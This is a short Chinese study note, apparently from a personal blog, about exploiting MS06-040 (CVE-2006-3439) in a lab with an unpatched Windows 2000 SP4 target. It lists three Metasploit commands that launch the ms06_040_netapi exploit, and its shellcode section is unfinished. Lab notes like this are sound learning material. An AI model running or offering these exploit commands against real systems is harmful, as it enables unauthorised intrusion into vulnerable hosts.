---
title: 漏洞学习笔记-005-Metasploit制作ShellCode
description: Metasploit制作ShellCode
date: 2020-10-20 22:20:00+0800
categories:
    - Exploit
tags:
    - Windows
    - Exploit
---

本文来源：[Moeomu的博客](/zh-cn/posts/漏洞学习笔记-005-Metasploit制作ShellCode/)

...未完待续(Metasploit旧版本真难找)...

## 入侵Windows实验

### 实验介绍

> MS06-040，CVE-2006-3439

|  | 推荐的环境 | 备注 |
|-|-|-|
| 攻击机系统 | Kali Linux 2021.1 | |
| 目标主机系统 | Windows 2000 SP4 | |
| 补丁版本 | KB921883 | 确保目标主机未安装补丁 |
| 网络环境 | 可互相ping通 | 确保无防火墙干扰 |

### 命令行界面漏洞测试

- `use exploit/windows/smb/ms06_040_netapi`
- `set rhosts 10.211.55.5`
- `exploit`

## 使用MetaSploit制作ShellCode

...未完待续...
